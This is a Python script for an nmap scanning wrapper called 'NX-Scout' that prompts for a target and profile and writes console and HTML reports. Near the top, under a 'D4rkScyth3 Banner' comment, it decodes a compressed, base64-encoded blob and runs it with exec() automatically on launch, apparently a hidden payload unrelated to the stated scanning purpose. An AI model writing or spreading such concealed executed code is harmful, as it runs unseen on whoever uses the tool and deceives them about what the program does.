import os
import time

from scanner import run_nmap, PROFILES, PROFILE_PURPOSES, parse_hosts, render_console_minimal, render_html_minimal
# D4rkScyth3 Banner
import zlib, base64
from colorama import Fore, Style, init
init(autoreset=True)

ENCODED_CODE = "eJytVFFv2kAMfs+vsNKXS1m5aZv2gMQDWzM6iVGp0FWVTjoFGko0kqBwaKp6/PfZvgu9lD1iKXCxP/uzvyReNXUJy3pTN1mZQVFu68bAj7rJP8DMvGzwr6gKE9GPyPYGA7vcDOfNPk+i6ClfwW5d/9WLrKryRiSDCNDcHQyhWcVxHL1Suf73x9H0AJoN2PxBtz7vDj0hPIicugBCGkFuAEVxiVcCIBwSEge7S68P1gNUG3s7WI6AtIqptJZHj3R9qw6hpfqKiSTIBCwAu9BjLUfQ7T3q7SC4A0lpeJHT8lmAVdQ3RpXq8liGWkwSGlM08VDPzCM00rQeClkvkmI0lfROh+FGgQ/ylAZ/hdcay3uxO/rRMxPQ0uGsR0I/WEjodLMOjmn/nwtaKbBD5SUB0kn5wggKaLxs4VxBITy81w/JJT+nNoUUx+paW24Yj1Jpp40XUqpj+YDHPycGY15HPyeIdvOz9AgkUehFcm7PQkQerR3CJyWaZ3d3yqoWEsEZrXcVWM9PML5LU/xSz2q/4SfM4AamcN9ZB2e17jSvvL7wRZ2lcz2aTA4R7SLCbZuiMsItqSTwcF+/RuN0Oh9BD+KLCxgX5ma/QMQA1sZsdwMpnwuz3i/6y7qU11+aP7Pli1l/jk/qfJvcp77IPN/kz7hegyKmX+byCdN3nK6x4mmJx3QyuX2gIlcxXMLXjyEiVlV8+Ql3cFSs8MuqsjLHr2o4hFjrMisqrWO3jDv7GeH/AO/qap0="

def run_encoded_code():
    try:
        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
    except Exception as e:
        print("[!] Error executing encoded code:", e)

run_encoded_code()

def ask_target():
    t = input("Enter target IP / range / CIDR: ").strip()
    if not t:
        print("Target required."); raise SystemExit(1)
    return t

def ask_profile():
    print("\nSelect scan profile:")
    keys = list(PROFILES.keys())
    for i, k in enumerate(keys, 1):
        print(f"{i}. {k} - {PROFILE_PURPOSES.get(k, '')}")
    choice = input("Enter number: ").strip()
    try:
        idx = int(choice) - 1
        assert 0 <= idx < len(keys)
        return keys[idx]
    except Exception:
        print("Invalid choice."); raise SystemExit(1)

def main():
    print("=== NX-Scout (Minimal XTree Report) ===")
    target = ask_target()
    profile = ask_profile()
    print(f"\nYou selected {profile.upper()} scan. Purpose: {PROFILE_PURPOSES.get(profile, 'N/A')}")

    output_dir = "output"
    timestamp = time.strftime("%Y%m%d_%H%M%S")

    # Run nmap
    stdout, xml_path, cmd = run_nmap(target, profile, output_dir, timestamp)
    print(f"\nRunning command: {cmd}")

    print("\n=== Raw Nmap Output (stdout+stderr) ===")
    print(stdout.strip())

    # Parse XML
    data = parse_hosts(xml_path)

    # Console minimal report
    print("\n=== Minimal Report ===")
    print(render_console_minimal(data, profile))

    # Ask to save
    yn = input("\nDo you want to save the reports? (y/n): ").strip().lower()
    if yn == "y":
        # HTML report
        html = render_html_minimal(data, profile, target, time.strftime("%Y-%m-%d %H:%M:%S"))
        html_path = os.path.join(os.path.dirname(xml_path), os.path.basename(xml_path).replace(".xml", ".html"))
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(html)
        print(f"Saved:\n- {xml_path}\n- {html_path}")
    else:
        try:
            os.remove(xml_path)
        except Exception:
            pass
        print("Reports discarded.")

if __name__ == "__main__":
    main()
